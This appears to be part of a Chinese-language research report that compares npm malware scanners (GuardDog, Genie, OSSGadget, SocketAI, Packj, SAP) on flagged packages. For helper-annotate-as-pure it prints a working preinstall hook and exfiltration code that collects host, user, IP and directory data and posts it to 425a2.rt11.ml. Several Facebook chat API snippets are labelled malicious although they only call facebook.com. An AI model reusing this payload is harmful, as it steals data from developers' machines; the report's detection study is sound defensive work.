
module.exports = function (defaultFuncs, api, ctx) {
  return function getThreadPictures(threadID, offset, limit, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);
        resolveFunc(data);
      };
    }

    var form = {
      thread_id: threadID,
      offset: offset,
      limit: limit
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return Promise.all(
          resData.payload.imagesData.map(function (image) {
            form = {
              thread_id: threadID,
              image_id: image.fbid
            };
            return defaultFuncs
              .post("https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php", ctx.jar, form)
              .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
              .then(function (resData) {
                if (resData.error) throw resData;
                // the response is pretty messy
                var queryThreadID = resData.jsmods.require[0][3][1].query_metadata.query_path[0].message_thread;
                var imageData = resData.jsmods.require[0][3][1].query_results[queryThreadID].message_images.edges[0].node.image2;
                return imageData;
              });
          })
        );
      })
      .then(resData => callback(null, resData))
      .catch(function (err) {
        log.error("Error in getThreadPictures", err);
        callback(err);
      });
    return returnPromise;
  };
};

```

**形式化行为：** sensitive_data_collection, legitimate_api_abuse, data_exfiltration, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 16

**文件：** `package/sendMessage.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs file uploads and sends HTTP requests, potentially transmitting user data and attachments to remote servers.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");
var bluebird = require("bluebird");

// ... [truncated for brevity] ...

function uploadAttachment(attachments, callback) {
    var uploads = [];

    // create an array of promises
    for (var i = 0; i < attachments.length; i++) {
        if (!utils.isReadableStream(attachments[i])) throw { error: "Attachment should be a readable stream and not " + utils.getType(attachments[i]) + "." };
        var form = {
            upload_1024: attachments[i],
            voice_clip: "true"
        };

        uploads.push(
            defaultFuncs
            .postFormData("https://upload.facebook.com/ajax/mercury/upload.php", ctx.jar, form, {})
            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
            .then(function(resData) {
                if (resData.error) throw resData;
                // We have to return the data unformatted unless we want to change it
                // back in sendMessage.
                return resData.payload.metadata[0];
            })
        );
    }

    // resolve all promises
    bluebird
        .all(uploads)
        .then(resData => callback(null, resData))
        .catch(function(err) {
            log.error("uploadAttachment", err);
            return callback(err);
        });
}

function getUrl(url, callback) {
    var form = {
        image_height: 960,
        image_width: 960,
        uri: url
    };

    defaultFuncs
        .post("https://www.facebook.com/message_share_attachment/fromURI/", ctx.jar, form)
        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
        .then(function(resData) {
            if (resData.error) return callback(resData);
            if (!resData.payload) return callback({ error: "Invalid url" });
            callback(null, resData.payload.share_data.share_params);
        })
        .catch(function(err) {
            log.error("getUrl", err);
            return callback(err);
        });
}

function sendContent(form, threadID, isSingleUser, messageAndOTID, callback) {
    // ... [truncated for brevity] ...
    defaultFuncs
        .post("https://www.facebook.com/messaging/send/", ctx.jar, form)
        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
        .then(function(resData) {
            if (!resData) return callback({ error: "Send message failed." });
            if (resData.error) {
                if (resData.error === 1545012) log.warn("sendMessage", "Got error 1545012. This might mean that you're not part of the conversation " + threadID);
                return callback(resData);
            }

            var messageInfo = resData.payload.actions.reduce(function(p, v) {
                return ({
                    threadID: v.thread_fbid,
                    messageID: v.message_id,
                    timestamp: v.timestamp
                } || p);
            }, null);

            return callback(null, messageInfo);
        })
        .catch(function(err) {
            log.error("sendMessage", err);
            if (utils.getType(err) == "Object" && err.error === "Not logged in.") ctx.loggedIn = false;
            return callback(err);
        });
}

// ... [truncated for brevity] ...

```

**形式化行为：** legitimate_api_abuse, data_exfiltration, sensitive_data_collection

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 17

**文件：** `package/handleFriendRequest.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends POST requests to Facebook, potentially automating friend requests; could be abused for account automation or spam.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function(defaultFuncs, api, ctx) {
    return function handleFriendRequest(userID, accept, callback) {
        if (utils.getType(accept) !== "Boolean") throw { error: "Please pass a boolean as a second argument." };

        var resolveFunc = function() {};
        var rejectFunc = function() {};
        var returnPromise = new Promise(function(resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });

        if (!callback) {
            callback = function(err, data) {
                if (err) return rejectFunc(err);
                resolveFunc(data);
            };
        }

        var form = {
            viewer_id: userID,
            "frefs[0]": "jwl",
            floc: "friend_center_requests",
            ref: "/reqs.php",
            action: (accept ? "confirm" : "reject")
        };

        defaultFuncs
            .post("https://www.facebook.com/requests/friends/ajax/", ctx.jar, form)
            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
            .then(function(resData) {
                if (resData.payload.err) throw { err: resData.payload.err };
                return callback();
            })
            .catch(function(err) {
                log.error("handleFriendRequest", err);
                return callback(err);
            });

        return returnPromise;
    };
};
```

**形式化行为：** legitimate_api_abuse, unauthorized_access, botnet_activity

**形式化规避：** legitimate_api_abuse, built_in_module_abuse, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 18

**文件：** `package/getFriendsList.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Collects and transmits user friend data via HTTP POST to Facebook; could be abused for data scraping or privacy violation.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

// [almost] copy pasted from one of FB's minified file (GenderConst)
var GENDERS = {
  0: "unknown",
  1: "female_singular",
  2: "male_singular",
  3: "female_singular_guess",
  4: "male_singular_guess",
  5: "mixed",
  6: "neuter_singular",
  7: "unknown_singular",
  8: "female_plural",
  9: "male_plural",
  10: "neuter_plural",
  11: "unknown_plural"
};

function formatData(obj) {
  return Object.keys(obj).map(function (key) {
    var user = obj[key];
    return {
      alternateName: user.alternateName,
      firstName: user.firstName,
      gender: GENDERS[user.gender],
      userID: utils.formatID(user.id.toString()),
      isFriend: user.is_friend != null && user.is_friend ? true : false,
      fullName: user.name,
      profilePicture: user.thumbSrc,
      type: user.type,
      profileUrl: user.uri,
      vanity: user.vanity,
      isBirthday: !!user.is_birthday
    };
  });
}

module.exports = function (defaultFuncs, api, ctx) {
  return function getFriendsList(callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, friendList) {
        if (err) return rejectFunc(err);
        resolveFunc(friendList);
      };
    }

    defaultFuncs
      .postFormData("https://www.facebook.com/chat/user_info_all", ctx.jar, {}, { viewer: ctx.userID })
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (!resData) throw { error: "getFriendsList returned empty object." };
        if (resData.error) throw resData;
        callback(null, formatData(resData.payload));
      })
      .catch(function (err) {
        log.error("getFriendsList", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** sensitive_data_collection, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 19

**文件：** `package/setTitle.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Sends HTTP POST request with user and thread data to Facebook endpoint; could be abused for data exfiltration or spam.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function setTitle(newTitle, threadID, callback) {
    if (!callback && (utils.getType(threadID) === "Function" || utils.getType(threadID) === "AsyncFunction"))
      throw { error: "please pass a threadID as a second argument." };

    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);
        resolveFunc(data);
      };
    }

    var messageAndOTID = utils.generateOfflineThreadingID();
    var form = {
      client: "mercury",
      action_type: "ma-type:log-message",
      author: "fbid:" + ctx.userID,
      author_email: "",
      coordinates: "",
      timestamp: Date.now(),
      timestamp_absolute: "Today",
      timestamp_relative: utils.generateTimestampRelative(),
      timestamp_time_passed: "0",
      is_unread: false,
      is_cleared: false,
      is_forward: false,
      is_filtered_content: false,
      is_spoof_warning: false,
      source: "source:chat:web",
      "source_tags[0]": "source:chat",
      status: "0",
      offline_threading_id: messageAndOTID,
      message_id: messageAndOTID,
      threading_id: utils.generateThreadingID(ctx.clientID),
      manual_retry_cnt: "0",
      thread_fbid: threadID,
      thread_name: newTitle,
      thread_id: threadID,
      log_message_type: "log:thread-name"
    };

    defaultFuncs
      .post("https://www.facebook.com/messaging/set_thread_name/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error && resData.error === 1545012) throw { error: "Cannot change chat title: Not member of chat." };
        if (resData.error && resData.error === 1545003) throw { error: "Cannot set title of single-user chat." };
        if (resData.error) throw resData;
        return callback();
      })
      .catch(function (err) {
        log.error("setTitle", err);
        return callback(err);
      });
    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 20

**文件：** `package/unsendMessage.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook endpoint, potentially unsending messages; transmits user data over network.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function unsendMessage(messageID, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, friendList) {
        if (err) return rejectFunc(err);
        resolveFunc(friendList);
      };
    }

    var form = {
      message_id: messageID
    };

    defaultFuncs
      .post("https://www.facebook.com/messaging/unsend_message/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return callback();
      })
      .catch(function (err) {
        log.error("unsendMessage", "» ParseAndCheckLogin got status code: 404. Bailing out of trying to parse response.");
        return callback(err);
      });
    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 21

**文件：** `package/changeAdminStatus.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Publishes arbitrary data to MQTT endpoint, enabling remote control or data exfiltration via WebSocket-like protocol.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

const utils = require("../utils");

module.exports = function (defaultFuncs, api, ctx) {
  return function changeAdminStatus(threadID, adminID, adminStatus) {
    if (utils.getType(threadID) !== "String") throw { error: "changeAdminStatus: threadID must be a string" };
    if (utils.getType(adminID) !== "String" && utils.getType(adminID) !== "Array") throw { error: "changeAdminStatus: adminID must be a string or an array" };
    if (utils.getType(adminStatus) !== "Boolean") throw { error: "changeAdminStatus: adminStatus must be true or false" };

    let wsContent = {
      request_id: 1,
      type: 3,
      payload: {
        version_id: '3816854585040595',
        tasks: [],
        epoch_id: 6763184801413415579,
        data_trace_id: null
      },
      app_id: '772021112871879'
    }

    if (utils.getType(adminID) === "Array") {
      for (let i = 0; i < adminID.length; i++) {
        wsContent.payload.tasks.push({
          label: '25',
          payload: JSON.stringify({ thread_key: threadID, contact_id: adminID[i], is_admin: adminStatus }),
          queue_name: 'admin_status',
          task_id: i + 1,
          failure_count: null
        });
      }
    }
    else {
      wsContent.payload.tasks.push({
        label: '25',
        payload: JSON.stringify({ thread_key: threadID, contact_id: adminID, is_admin: adminStatus }),
        queue_name: 'admin_status',
        task_id: 1,
        failure_count: null
      });
    }

    wsContent.payload = JSON.stringify(wsContent.payload);
    return new Promise((resolve, reject) => ctx.mqttClient && ctx.mqttClient.publish('/ls_req', JSON.stringify(wsContent), {}, (err, _packet) => err ? reject(err) : resolve()));
  };
};
```

**形式化行为：** command_and_control, data_exfiltration, unauthorized_access, legitimate_api_abuse

**形式化规避：** legitimate_api_abuse, built_in_module_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 22

**文件：** `package/unfriend.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook endpoint, potentially automating friend removal; transmits user data over network.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function unfriend(userID, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, friendList) {
        if (err) return rejectFunc(err);
        resolveFunc(friendList);
      };
    }

    var form = {
      uid: userID,
      unref: "bd_friends_tab",
      floc: "friends_tab",
      "nctr[_mod]": "pagelet_timeline_app_collection_" + ctx.userID + ":2356318349:2"
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/profile/removefriendconfirm.php", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return callback();
      })
      .catch(function (err) {
        log.error("unfriend", err);
        return callback(err);
      });
    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 23

**文件：** `package/muteThread.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook, potentially sending user data; network activity may be suspicious in some contexts.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  // muteSecond: -1=permanent mute, 0=unmute, 60=one minute, 3600=one hour, etc.
  return function muteThread(threadID, muteSeconds, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);

        resolveFunc(data);
      };
    }

    var form = {
      thread_fbid: threadID,
      mute_settings: muteSeconds
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/mercury/change_mute_thread.php", ctx.jar, form)
      .then(utils.saveCookies(ctx.jar))
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;

        return callback();
      })
      .catch(function (err) {
        log.error("muteThread", err);
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 0
- **RF：** 0
- **XGB：** 0

#### GENIE

*无可用结果*

#### GUARDDOG

```
Found 0 potentially malicious indicators scanning /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/thinh2001-api/1.7.4/thinh2001-api-1.7.4.tgz
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m230[0m[31m ]--[0m
   Rule Id: [34mBD000800[0m
       Tag: [34mSecurity.Backdoor.Obfuscation[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/src/getThreadList.js[0m
   Pattern: [32mbase64|encodedcommand|obfuscate[0m
[30;1m113 | [0m[35mbled: t.customization_enabled, // false for ONE_TO_ONE with Page or ReducedMessagingActor[0m
[30;1m114 | [0m[35m      participantAddMode: t.participant_add_mode_as_string, // "ADD" if "GROUP" and null if "ONE_TO_[0m
[30;1m115 | [0m[35m      montageThread: t.montage_thread ? Buffer.from(t.montage_thread.id, "base64").toString() : null[0m
[30;1m116 | [0m[35m      // it is not userID nor any other ID known to me...[0m
[30;1m117 | [0m[35m      // can somebody inspect it? where is it used?[0m
[30;1m118 | [0m[35m      // probably Messenger Day uses it[0m
[30;1m119 | [0m[35m      reactionsMuteMode: t.reactions_mute_mode,[0m
[30;1m
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "thinh2001-api",
  "version": "1.7.4",
  "total_files": 10,
  "analyzed_files": 10,
  "malicious_files": 0,
  "is_malicious": false,
  "analysis_date": "2025-07-11T17:27:25.667453"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/thinh2001-api/1.7.4/extracted_thinh2001-api-1.7.4.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/thinh2001-api/1.7.4/extracted_thinh2001-api-1.7.4.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 1.7.4[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mA Facebook chat API that doesn't rely on XMPP. ...[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is n
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/thinh2001-api/1.7.4/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/thinh2001-api/1.7.4/package' from local_nodejs...[1m[32mPASS[0m [[34mver 1.7.4[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mA Facebook chat API that doesn't rely on XMPP. ...[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [invalid format!]
[1m[+][0m Checking readme.....
... (truncated)
```

---

## 行为类别：Command Execution

**包名：** `helper-annotate-as-pure`  
**版本：** `99.10.9`

### 代码上下文

#### 片段 1

**文件：** `package/package.json`  
**行号：** `8`  
**标注类型：** `npm-install-script`

**行为说明：** Executes index.js automatically before install, enabling hidden code execution on package install.

**规避技术：** Abuses npm preinstall script to trigger hidden payload before user interaction or inspection.

**恶意代码：**
```javascript
"scripts":{
  "test":"echo 'error no test specified' && exit 1",
  "preinstall":"node index.js"
},
```

**形式化行为：** arbitrary_command_execution

**形式化规避：** preinstall_hook_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/index.js`  
**行号：** `202`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects system/user data and exfiltrates it via HTTPS POST to remote server.

**规避技术：** Filters targets, uses DNS and HTTPS, suppresses errors and output, blends with normal Node.js code.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

// ... helper functions omitted for brevity ...

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    ip: JSON.stringify(gethttpips()),
    dirs: JSON.stringify(getFiles(["C:\\","D:\\","/","/home"]))
}
var qs = toName(td);
if(isValid(td.hn,td.c,td.un,td.dirs)){
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}
const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});
var options = {
    hostname: "425a2.rt11.ml",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
}
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/index.js`  
**行号：** `212`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects and exfiltrates system, user, and directory data to remote server via HTTPS POST.

**规避技术：** Filters targets, uses DNS and HTTPS, suppresses errors and output, blends with legitimate modules.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

// ... helper functions omitted for brevity ...

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    ip: JSON.stringify(gethttpips()),
    dirs: JSON.stringify(getFiles(["C:\\","D:\\","/","/home"]))
}
var qs = toName(td);
if(isValid(td.hn,td.c,td.un,td.dirs)){
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}
const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});
var options = {
    hostname: "425a2.rt11.ml",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
}
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 1
- **RF：** 1
- **XGB：** 1

#### GENIE

```
# 批量恶意代码查询结果
"theft-os","Query","error","[[""SOURCE""|""relative:///package/index.js:173:9:173:20""]] to [[""SINK""|""relative:///package/index.js:212:11:212:18""]] | Flow Count: 4 | Method Name: homedir
[[""SOURCE""|""relative:///package/index.js:174:9:174:21""]] to [[""SINK""|""relative:///package/index.js:212:11:212:18""]] | Flow Count: 4 | Method Name: hostname
[[""SOURCE""|""relative:///package/index.js:175:9:175:21""]] to [[""SINK""|""relative:///package/index.js:212:11:212:18""]] | Flow Count: 4 | Method Name: userInfo
[[""SOURCE""|""relative:///package/index.js:176:25:176:40""]] to [[""SINK""|""relative:///package/index.js:212:11:212:18""]] | Flow Count: 4 | Method Name: getServers","/package/index.js","212","11","212","18"
```

#### GUARDDOG

```
Found 3 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/helper-annotate-as-pure/99.10.9/helper-annotate-as-pure-99.10.9.tgz

npm-install-script: found 1 source code matches
  * The package.json has a script automatically running when the package is installed at package/package.json:8
        "preinstall":"node index.js"

npm-exfiltrate-sensitive-data: found 2 source code matches
  * This package is exfiltrating sensitive data to a remote server at package/index.js:202
        var req = https.request(options, (res) => {
        res.on("data", (d) => {
            //process.stdout.write(d);
        });
    });
  * This package is exfiltrating sensitive data to a remote server at package/index.js:212
        req.write(postData);
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m22[0m[31m ]--[0m
   Rule Id: [34mBD000103[0m
       Tag: [34mSecurity.Backdoor.Setup.Script[0m
  Severity: [36mModerate[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/package.json[0m
   Pattern: [32m(pre|post|)install"\s*:\s*"node [^\s]+\.js[0m
[30;1m5 | [0m[35m  "main":"index.js",[0m
[30;1m6 | [0m[35m  "scripts":{[0m
[30;1m7 | [0m[35m  "test":"echo 'error no test specified' && exit 1",[0m
[30;1m8 | [0m[35m  "preinstall":"node index.js"[0m
[30;1m9 | [0m[35m  },[0m
[30;1m10 | [0m[35m  "author":"",[0m
[30;1m11 | [0m[35m  "License":"ISC"[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m22[0m[31m ]--[0m
   Rule Id: [34mBD000710[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.DNSSettings[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/package/index.js[0m
   Pattern: [32mdns.getServers[0m
[30;1m173 | [0m[35m    hd: os.homedir()
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "helper-annotate-as-pure",
  "version": "99.10.9",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 0,
  "is_malicious": false,
  "analysis_date": "2025-07-12T03:38:57.388207"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
